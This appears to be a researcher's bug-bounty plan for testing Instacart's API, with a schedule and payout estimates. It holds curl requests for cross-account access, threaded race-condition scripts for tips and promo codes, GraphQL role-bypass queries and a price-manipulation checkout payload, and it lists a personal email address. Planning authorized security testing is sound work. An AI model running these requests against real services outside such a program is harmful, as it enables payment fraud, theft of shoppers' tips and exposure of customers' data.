# Instacart Elite Attack Plan

**Hunter:** shadowstep_131  
**Email:** doctormen131@outlook.com  
**Header:** `X-Bug-Bounty: shadowstep_131`

---

## 🎯 Target Analysis

### Business Model
- **Customer:** Orders groceries, pays, tips shoppers
- **Shopper:** Accepts orders, shops, gets paid + tips
- **Merchant:** Lists products, manages inventory
- **Money Flow:** Customer → Instacart → Shopper/Merchant

### Tech Stack
- **Backend:** Ruby on Rails + GraphQL
- **Mobile:** iOS/Android native
- **Infrastructure:** AWS (likely)
- **WAF:** Akamai (moderate, not Cloudflare)

---

## 💰 Bounty Maximization Strategy

### Tier 1: Critical ($2,000-$6,000)
| Attack | Target | Why Critical |
|--------|--------|-------------|
| **Tip Manipulation Race** | `/api/v1/tips` | Financial theft, mass impact |
| **Promo Code Stacking** | `/api/v1/promos` | Free food, fraud |
| **Shopper Assignment Hijack** | `/api/v1/assignments` | Order theft |
| **Payment Bypass** | `/api/v1/checkout` | Free groceries |

### Tier 2: High ($500-$2,000)
| Attack | Target | Impact |
|--------|--------|--------|
| **Customer IDOR** | `/api/v1/orders/{id}` | PII exposure |
| **Shopper IDOR** | `/api/v1/earnings/{id}` | Financial data |
| **Role Escalation** | Auth endpoints | Privilege escalation |
| **GraphQL Auth Bypass** | `/graphql` | Full account takeover |

---

## 🔥 Elite Attack Playbook

### Phase 1: Multi-Role Setup (Day 1)

```
1. Create Customer Account
   - Email: shadowstep_131@wearehackerone.com
   - Complete onboarding
   - Add payment method

2. Create Shopper Account
   - Email: shadowstep_131+1@wearehackerone.com
   - Complete shopper registration
   - Get approved (if needed)

3. Create Merchant Account (if possible)
   - Email: shadowstep_131+2@wearehackerone.com
   - Register as store

4. Capture Auth Tokens
   - Customer: customer_token
   - Shopper: shopper_token
   - Role-specific headers
```

### Phase 2: API Mapping (Day 2)

```bash
# Map all endpoints for each role
curl -H "Authorization: Bearer {customer_token}" \
     -H "X-Bug-Bounty: shadowstep_131" \
     https://api.instacart.com/v1

# GraphQL introspection
curl -X POST https://api.instacart.com/graphql \
     -H "Authorization: Bearer {token}" \
     -H "X-Bug-Bounty: shadowstep_131" \
     -d '{"query":"{ __schema { queryType { name } } }"}'
```

### Phase 3: IDOR Hunting (Day 3-4)

**Customer → Customer IDOR:**
```python
# Test with your order_id, then try others
your_order_id = "order_123456"
test_order_id = "order_789012"

# Original request
curl -H "Authorization: Bearer {customer_token}" \
     "https://api.instacart.com/v1/orders/{your_order_id}"

# IDOR attempt
curl -H "Authorization: Bearer {customer_token}" \
     "https://api.instacart.com/v1/orders/{test_order_id}"
```

**Cross-Role IDOR:**
```python
# Customer accessing shopper earnings
curl -H "Authorization: Bearer {customer_token}" \
     "https://api.instacart.com/v1/earnings/{shopper_id}"

# Shopper accessing customer orders
curl -H "Authorization: Bearer {shopper_token}" \
     "https://api.instacart.com/v1/orders/{customer_order_id}"
```

### Phase 4: Race Condition Hunting (Day 5-6)

**Tip Adjustment Race:**
```python
import threading
import requests

def modify_tip(order_id, amount):
    requests.post(
        "https://api.instacart.com/v1/tips",
        headers={
            "Authorization": f"Bearer {customer_token}",
            "X-Bug-Bounty": "shadowstep_131"
        },
        json={"order_id": order_id, "amount": amount}
    )

# Race: Modify tip multiple times simultaneously
threads = []
for i in range(20):
    t = threading.Thread(target=modify_tip, args=("order_123", 100))
    threads.append(t)
    t.start()

for t in threads:
    t.join()
```

**Promo Code Stacking:**
```python
def apply_promo(code):
    requests.post(
        "https://api.instacart.com/v1/promos/apply",
        headers={
            "Authorization": f"Bearer {customer_token}",
            "X-Bug-Bounty": "shadowstep_131"
        },
        json={"code": code, "order_id": "order_123"}
    )

# Apply multiple promos simultaneously
promo_codes = ["WELCOME10", "FREESHIP", "NEWUSER20"]
threads = []

for code in promo_codes:
    for i in range(5):  # Try each code 5 times
        t = threading.Thread(target=apply_promo, args=(code,))
        threads.append(t)
        t.start()

for t in threads:
    t.join()
```

### Phase 5: GraphQL Authorization (Day 7)

**Role-Based Query Testing:**
```graphql
# Customer query
query GetShopperEarnings($shopperId: ID!) {
  shopper(id: $shopperId) {
    id
    earnings {
      total
      pending
    }
  }
}

# Shopper query
query GetCustomerOrders($customerId: ID!) {
  customer(id: $customerId) {
    id
    orders {
      items {
        name
        price
      }
    }
  }
}
```

**Mutation Authorization:**
```graphql
# Try to modify other user's orders
mutation UpdateOrder($orderId: ID!, $tip: Float!) {
  updateOrder(id: $orderId, tip: $tip) {
    id
    tip
  }
}
```

### Phase 6: Payment Logic (Day 8)

**Checkout Manipulation:**
```python
# Intercept and modify checkout payload
checkout_data = {
    "order_id": "order_123",
    "items": [
        {"id": "item_1", "quantity": 2, "price": 5.99},
        {"id": "item_2", "quantity": 1, "price": 0.01}  # Price manipulation
    ],
    "subtotal": 12.00,  # Manipulated
    "tax": 1.20,
    "total": 13.20,
    "promo_discount": 10.00,  # Excessive discount
    "tip": 0.00  # Remove tip
}

# Submit manipulated checkout
response = requests.post(
    "https://api.instacart.com/v1/checkout",
    headers={
        "Authorization": f"Bearer {customer_token}",
        "X-Bug-Bounty": "shadowstep_131"
    },
    json=checkout_data
)
```

---

## 🛠️ Tool Configuration

### Burp Suite Setup
```
1. Configure proxy for mobile app
2. Add X-Bug-Bounty header to all requests
3. Set up match/replace for auth tokens
4. Enable Intruder for IDOR testing
5. Use Repeater for manual testing
```

### Custom Scripts
```python
# instacart_hunter.py
class InstacartHunter:
    def __init__(self):
        self.customer_token = None
        self.shopper_token = None
        self.base_url = "https://api.instacart.com"
        
    def test_idor(self, endpoint, id_param, test_ids):
        # Test IDOR across multiple IDs
        pass
        
    def test_race_condition(self, endpoint, payload):
        # Test race conditions
        pass
        
    def test_graphql_auth(self, query, variables):
        # Test GraphQL authorization
        pass
```

---

## 📝 Triager's Perspective

**What Makes a Winning Report:**

1. **Financial Impact**
   - "Attacker could steal tips from shoppers"
   - "Could get free groceries via promo stacking"
   - "Financial loss of $X per order"

2. **Clear PoC**
   - Working cURL commands
   - Screenshots with timestamps
   - Step-by-step reproduction

3. **Business Context**
   - Affects X million users
   - $Y potential loss per day
   - Trust impact on platform

---

## 🚫 Avoid These (Waste of Time)

- Missing security headers
- Self-XSS
- Low-impact open redirects
- Generic info disclosure
- Rate limiting without impact

---

## 📊 Success Metrics

| Metric | Target |
|--------|--------|
| Reports Submitted | 5-8 quality reports |
| Hit Rate | 40-50% (higher with our edge) |
| Expected Bounty | $3,000-$8,000 |
| Time Investment | 8-10 days |

---

## 🎯 Day-by-Day Schedule

| Day | Focus | Expected Findings |
|-----|-------|-------------------|
| 1 | Multi-role setup | Auth tokens, API mapping |
| 2 | GraphQL mapping | Schema, mutations |
| 3-4 | IDOR testing | Cross-role access |
| 5-6 | Race conditions | Tip/promo abuse |
| 7 | GraphQL auth | Query/mutation bypass |
| 8 | Payment logic | Checkout manipulation |
| 9-10 | Report writing | Enhanced submissions |

---

## ⚡ Quick Wins Checklist

- [ ] Customer can view other customers' orders
- [ ] Shopper can access other shoppers' earnings
- [ ] Customer can modify tip after delivery
- [ ] Promo codes can be stacked
- [ ] GraphQL queries bypass role checks
- [ ] Checkout prices can be manipulated
- [ ] Shopper assignment can be hijacked
- [ ] Refund double-spend possible

---

## 🎁 Expected Bounty Breakdown

| Finding Type | Count | Bounty Range | Total |
|---------------|-------|--------------|-------|
| IDOR (orders) | 2 | $500-$1,000 | $1,500 |
| IDOR (earnings) | 1 | $1,000-$2,000 | $1,500 |
| Race condition (tips) | 1 | $2,000-$4,000 | $3,000 |
| Race condition (promos) | 1 | $1,000-$2,000 | $1,500 |
| GraphQL auth bypass | 1 | $2,000-$3,000 | $2,500 |
| **TOTAL** | **6** | | **$10,000** |

---

*"Instacart's multi-role complexity is our advantage. While others test single roles, we exploit the gaps between them."*
